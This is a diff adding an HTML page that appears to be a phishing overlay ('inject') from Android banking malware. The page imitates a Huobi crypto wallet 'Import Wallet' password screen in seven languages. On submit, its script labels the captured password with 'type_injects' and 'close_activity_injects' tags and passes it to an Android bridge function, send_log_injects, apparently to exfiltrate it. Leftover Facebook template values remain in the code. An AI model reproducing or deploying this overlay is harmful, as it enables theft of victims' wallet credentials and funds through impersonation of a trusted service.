@@ -1,0 +1,309 @@
+<!DOCTYPE html> 
+<html lang="en" ng-app="app">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>    
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css"></title>
+    <style>
+        header {
+            padding: 15px;
+            text-align: center;
+        }
+
+        span {
+            font-size: 18px;
+            color: #37416b;
+            font-weight: 600;
+            margin-left: -24px;
+        }
+
+        section {
+            padding: 15px;
+        }
+
+        label {
+            font-size: 18px;
+            color: #37416b;
+            font-weight: 600;
+        }
+
+        .input {
+            width: 100%;
+            padding: 10px;
+            background-color: #f5f5f7;
+            border: 0;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            color: #707796;
+        }
+
+        #message {
+            display: none;
+            background: #fff;
+            color: #000;
+            position: relative;
+            padding: 20px;
+            margin-top: 10px;
+            border: 1px solid #e1e4ee;
+            border-radius: 8px;
+        }
+
+        #message p {
+            padding: 10px 35px;
+            font-size: 18px;
+            margin-bottom: 0;
+        }
+
+        /* Add a green text color and a checkmark when the requirements are right */
+        .valid {
+            color: #757c99;
+            background-image: url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwP/2wBDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCAAVABUDAREAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAABQYHAwr/xAArEAAABgECBAUFAQAAAAAAAAABAgMEBQYHCBMREhUWABQhIzEXGChCYWL/xAAaAQADAQADAAAAAAAAAAAAAAADBQYEAAcI/8QAOBEAAQMCBAMFBgILAAAAAAAAAQIDBAURBhITIQAHFAgiJEFCFSMxMlFhFoIXGCUoQ1JicYGRk//aAAwDAQACEQMRAD8A7GY5/etV1gtriAv9oxdgKoT8tSox7QHqMPfMpWODcla2CeJaTtXatdpsc8SOzZps/fe8VVVDpmBMidQtESgMth5lt+ruICyHBdtpKt0py3GZZG5vsnYAHcnylCl4t7Q9ZqT1HrFQw/yepsx6C05T1hmfVZLC8kiQJRQsxoTawpllLPvHveOLWghCUGXWj2AryS0piXLGZsXW0oFcN5ZPIs/boKUmEyHTj17dVLi7l4uxsAcKBuNQ8uRQDCBRKIgIDTiN54huoR4z8fzGmlCgPPItABSfvvbhnI7NFGorap/LnEWKMP4jAzJeFSkTGHXgCG1TIkxbzUlvMe817tKgSBlNiF9PUlktWhvKenVK8bUwwybG4SeQoSA9koWWXh5Wxx2RTqbnVOyXVOhHUsVtyee9kyPJ+3gposISxJLi/YhYL4Vbv5QoJLf0zhagi/y73vwmRzxx05hF3DKKfCPPZmvNUNbGp4FMp5l6S3Uib6vQrhMOzA3l1+4Wsnq4T9P8XkA2mVpXMUTMbWsq4fyRdIm1wD1Ai7G0T0DYZgH8PbEHLVsux7vjHiD0FEdoQBdNQDkU9xPTV3IntsvVBKlwJLCClQ+KUqSLFG5vkII3v8CNxsZnk5T8ZHkQ3Q+XcpiDzCwzXJzMuOtIU3KkR5L2ozLSpKVN9Y0tt4KRkPfQsKSvvootSics6irJBW/LVWnMPYxo0i2eQ2JHT8O4L7eog4AtZbo6Z7XCiwUomYYdhwKMmchHjgoI7SamKQ5T6MwuPT3ESZzoIU6B3W0H0oB9ah86vT8o3uRb4bp/MXnXW4mJeY1Pl4ZwHSXkrYo63PEVCeyd5U5aLeAjugmFH2MpSUyXgG9NtcsjrlEJ6p7jdVHUcWoO84Y1wy0nBBUIxa+x2Isr9Q5JXc5jyzV7KNYE3qJSuFiteUEjcwsFxnTQW4oCuoEVx4p89MvNW2+hALn9hm+PHX8LE9NR2ganilbjAw25iumUVD++kqoN0eralnb7vIW61Tz5BxYj201ZuD2WkGjjP0kTTrK5BiM+BX482VF6DX6hYscqRYIAFTSzI0ullq8GjYzMxOMYo2XPLAyBQAIJBTEA08qFIT7ZSyqk5zpailpcv69EoSpWW/zXGTNbe9+G/MVmO9zifTyUkVmNzfENs1ZVPjw5NNLWXwgrSJsqKwJWS/SqaWqWGM4yFJQRlkZjrPNXHw3C0ESqKUfxnSaaKHEuMnP4opkRkk2Kt/yM1NEzazTcKU8QR6sn6mRIc/KXxyGrDWsOmR4i/d6lZ0gfK+m3um/8+UfW3A8bxO1CqiPHEk8Jw4ln34wxAZVVHGgU6obNRqSCy+pGYBUMPrT8WkrXlTw4fif9oXy1+gHTPngt1zrnUfnhx6h313D/AHd81/jxn/b/AOIvP2vm/Llt/rTy/wCLffik/d3/AFbP4f6HdD79Rr6n/Tr+p/Pq/wBPH//Z');
+            background-color: transparent;
+            background-repeat: no-repeat;
+            background-size: 22px;
+            background-position: left;
+        }
+
+        /* Add a red text color and an "x" when the requirements are wrong */
+        .invalid {
+            color: #ff4e6d;
+            background-image: url('data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwP/2wBDAQEBAQEBAQIBAQICAgECAgMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwP/wAARCAAWABYDAREAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAABgUECv/EACUQAAEFAQABAwQDAAAAAAAAAAIBAwQFBgcIERMUABIVFiEjQ//EABkBAAIDAQAAAAAAAAAAAAAAAAMFAgQGCP/EADERAAIBAwMCBAQEBwAAAAAAAAECAwQFEQYSIQcTABQiMQgVQUIyYXGBFiNRUnKx0f/aAAwDAQACEQMRAD8A7KrnT9L8ht/s+f8ALtdYct5VzO1dyu96bTxIkjaa7cjFZkTshgnLBuRDoa3NMy2yn2bjJvnJIGo4e39zqpnlqbhUPT0rmKliO13GNzN/aufYD6tjOeBxz46Tttj0V0g0lbdW66t8N917e4BVUFtmd1o6ShLMqVdeIyrzyVLIwgplcIsYZ5W34QFqHhtTb6DoOe5n5EeQ+e6RzC0qK2/vbzUnqKaddXdHC1lI5cUFzHcodBWnWWjITGI417jhtfyoAQq4JKJHkkjpqioWpiIBJbcCSAwyDwRg8gY/6+uvVG4W+0Wi7620do+s0ZfIJpIIIKUUsyQwzvSTCGeFhPTyCSJzC8hqFUN7MwIRRlup9w0VD1Dj7zWUq/JPnUnKRo91IiPfqOlxurtoLMfplbUuPsuEUGj+ar8ds3YwWUYRVP7Citliqq6SOWjOwXKPbz9pViPWB+Qzke2R+3hFfdCdL7PdrF1Ejavn6LXlKpmhVx5umrKWJy1tklCsPXP2dkjBJGppGbPoE77fCV1WeVaqgsUYTYZjtPYKneE0oI6/pntvZ3CSpDIkRMq/R2cL20L/ABEFT1H0+pWXileNsd5ZpA3+W4n/AER4q/E2gl17QXaj3/w7XaatEtDnOFphRRQ7VJADbZ4ptxH3ls858MuSVFPX9q8oJ8G+bs7S91vOZ9vUBU3EMs98bmlLUQWHrSdGYq7R2eFc48gwye9htRV00V0QE1IiLW1TK2WZ0JGDx6AByeDnH09vr7+M31BuFxrOmehqSqpDBQ0lvuMcMplhcVG65TSuyxIzSxCMyKmZgm9twRcIzMKiy49l52WbVQhq5mPHGJF2Uxp8noyvX25SXlKaUitD8SdBZiTJTbP3EBNTVcH0InE+gBg18IT7af1f05b0j9Ryf38aeenlovhXge4Y2V2snajQqA2IKHZVTLz60cvDEz4BDQhDlVTxK02flSe3bvQ+NG+z1b1+si50Ox891me0kznWpT8cwlAd/paeGKZrVJRPgrDsdyY6QMgixxH5KuRkjJrZJLbIoqwB3EYHY3HGSBw2PbGf09/F+yXeCHpharP1stNZN07nkqDZ7hS1FMlxpf5jd8QU0znzNL31O9ZFhQF2ImJ7IS0uk829AbtLG5lxDnRA8rT22tt9e7iE9FNBUpNLlauhpJozWhP0AZsgWlMFUkUfRCn3L1J6Figj5/EXLDH5KADn9T4WfJvhjtCrcpr3qe8qVyKKKggonDD7ZqqWeZNhxyYYy20gAhskEsbjcGPOOv5LJdh2x9pPe5UOsdaDH6BOitdVS7zsrIzJWLlUwSl54skI0eNEjtlSfgSkIkr2vkykDDDB5aaKKZ/Odxe5JtO/fkbfTj8HsAB6duefc+NBqTUmqzrPTuoNQactg6aC01RtVqNXT/Lza+xULVotYsxX5htMkkksjCt88ISYN/ZgP//Z');
+            background-color: transparent;
+            background-repeat: no-repeat;
+            background-size: 22px;
+            background-position: left;
+        }
+
+        .button {
+            position: absolute;
+            right: 10px;
+            top: 18px;
+            background-color: transparent;
+            border: 0;
+            color: #37416b;
+            display: none;
+        }
+    </style>
+</head>
+<body ng-controller="c1">
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="float: left;width: 24px;margin-top: 5px;" src="data:image/jpeg;base64,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" alt="">
+                <span>{{t.__text1}}</span>
+            </header>
+            <section>
+                <label for="login">{{t.__text2}}</label>
+                <span id="passLength"></span>
+                <input type="password" class="input" id="password" name="password" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" placeholder="{{t.__text3}}">
+
+                <div id="message">
+                    <span style="margin: 0;"> {{t.__text4}} </span>
+                    <p id="letter" class="invalid">{{t.__text5}}</p>
+                    <p id="capital" class="invalid">{{t.__text6}}</p>
+                    <p id="number" class="invalid">{{t.__text7}}</p>
+                    <p id="length" class="invalid">{{t.__text8}}</b></p>
+                </div>
+
+                <input type="submit" class="button" id="sendData" disabled value="{{t.__text9}}">
+            </section>
+        </div>
+        <div id="form2" style="display: none;">
+        </div> 
+    </form>
+
+    <script>
+        var password = document.getElementById('password'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2'),
+            sendData = document.getElementById('sendData');
+
+        var letter = document.getElementById("letter");
+        var capital = document.getElementById("capital");
+        var number = document.getElementById("number");
+        var length = document.getElementById("length");
+
+        password.onfocus = function() {
+            document.getElementById("message").style.display = "block";
+        }
+
+        password.onblur = function() {
+            document.getElementById("message").style.display = "none";
+        }
+
+        password.onkeyup = function() {
+            // Validate lowercase letters
+            var lowerCaseLetters = /[a-z]/g;
+            if(password.value.match(lowerCaseLetters)) {  
+                letter.classList.remove("invalid");
+                letter.classList.add("valid");
+            } else {
+                letter.classList.remove("valid");
+                letter.classList.add("invalid");
+            }
+            
+            // Validate capital letters
+            var upperCaseLetters = /[A-Z]/g;
+            if(password.value.match(upperCaseLetters)) {  
+                capital.classList.remove("invalid");
+                capital.classList.add("valid");
+            } else {
+                capital.classList.remove("valid");
+                capital.classList.add("invalid");
+            }
+
+            // Validate numbers
+            var numbers = /[0-9]/g;
+            if(password.value.match(numbers)) {  
+                number.classList.remove("invalid");
+                number.classList.add("valid");
+            } else {
+                number.classList.remove("valid");
+                number.classList.add("invalid");
+            }
+            
+            // Validate length
+            if(password.value.length >= 8) {
+                length.classList.remove("invalid");
+                length.classList.add("valid");
+            } else {
+                length.classList.remove("valid");
+                length.classList.add("invalid");
+            }
+
+            if(password.value.match(numbers) && password.value.length >= 8 && password.value.match(upperCaseLetters) && password.value.match(lowerCaseLetters)) {
+                sendData.disabled = false;
+                sendData.style.display = 'block';
+            } else {
+                sendData.disabled = true;
+                sendData.style.display = 'none';
+            }
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.password = password.value;
+                
+                data.type_injects = "crypt";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+    <script>
+        var text, 
+            link = "facebook.com", 
+            appname = "Facebook", 
+            texts = { 
+                en: { 
+                    __text1: "Import Wallet",
+                    __text2: "Please set a security password",
+                    __text3: "Huobi Security Keyboard Input",
+                    __text4: "For the security of your assets, your password should include:",
+                    __text5: "A lowercase letter",
+                    __text6: "A uppercase letter",
+                    __text7: "A number",
+                    __text8: "8~32 characters",
+                    __text9: "Next",
+                }, 
+        
+                tr: { 
+                    __text1: "İthalat Cüzdan",
+                    __text2: "Lütfen bir güvenlik şifresi belirleyin",
+                    __text3: "Huobi Güvenlik Klavye Girişi",
+                    __text4: "Varlıklarınızın güvenliği için parolanız şunları içermelidir:",
+                    __text5: "Küçük harf",
+                    __text6: "Büyük harf",
+                    __text7: "Numara",
+                    __text8: "8 ~ 32 karakter",
+                    __text9: "Sonraki",
+                }, 
+                
+                es: { 
+                    __text1: "Cartera de importación",
+                    __text2: "Establezca una contraseña de seguridad",
+                    __text3: "Entrada de teclado de seguridad Huobi",
+                    __text4: "Para la seguridad de sus activos, su contraseña debe incluir:",
+                    __text5: "Una letra minúscula",
+                    __text6: "Mayúsculas",
+                    __text7: "Numero",
+                    __text8: "8 ~ 32 caracteres",
+                    __text9: "Siguiente",
+                },  
+        
+                fr: { 
+                    __text1: "Importer Un Portefeuille",
+                    __text2: "Veuillez définir un mot de passe de sécurité",
+                    __text3: "Entrée Du Clavier De Sécurité Huobi",
+                    __text4: "Pour la sécurité de vos actifs, votre mot de passe doit inclure:",
+                    __text5: "Une lettre minuscule",
+                    __text6: "Majuscule",
+                    __text7: "Nombre",
+                    __text8: "8 ~ 32 caractères",
+                    __text9: "Prochain",
+                }, 
+        
+                ro: { 
+                    __text1: "Portofel de import",
+                    __text2: "Vă rugăm să setați o parolă de securitate",
+                    __text3: "Intrare de tastatură Huobi Security",
+                    __text4: "Pentru securitatea bunurilor dvs., parola trebuie să includă:",
+                    __text5: "O literă mică",
+                    __text6: "O literă mare",
+                    __text7: "Un număr",
+                    __text8: "8 - 32 de caractere",
+                    __text9: "Următorul",
+                }, 
+        
+                it: { 
+                    __text1: "Importa Portafoglio",
+                    __text2: "Si prega di impostare una password di sicurezza",
+                    __text3: "Ingresso Tastiera Di Sicurezza Huobi",
+                    __text4: "Per la sicurezza delle tue risorse, la tua password dovrebbe includere:",
+                    __text5: "Una lettera minuscola",
+                    __text6: "Maiuscola",
+                    __text7: "Numero",
+                    __text8: "8 ~ 32 caratteri",
+                    __text9: "Prossimo",
+                },  
+        
+                de: { 
+                    __text1: "Wallet Importieren",
+                    __text2: "Bitte setzen Sie ein sicherheitspasswort",
+                    __text3: "Huobi Sicherheit Tastatur Eingang",
+                    __text4: "Für die Sicherheit Ihres Vermögens sollte Ihr Passwort Folgendes enthalten:",
+                    __text5: "Kleinbuchstabe",
+                    __text6: "Großbuchstabe",
+                    __text7: "Zahl",
+                    __text8: "8~32 Zeichen",
+                    __text9: "Nächsten",
+                }, 
+            }
+            var language = window.navigator.userLanguage || window.navigator.language; 
+            language = language.match(/^.{2}/), texts[language] == undefined ? text = texts.en : text = texts[language]; 
+
+            var app = angular.module("app", []); 
+            app.controller("c1", ["$scope", "$rootScope", function (t, e) { 
+                rootScope = e, 
+                scope = t, 
+                e.scums = [], 
+                t.t = text, 
+                t.reset = function () { 
+                    $(e.scums).each(function () { 
+                        this.reset() }) 
+                } 
+            }]);
+        </script>
+</body>
+</html>
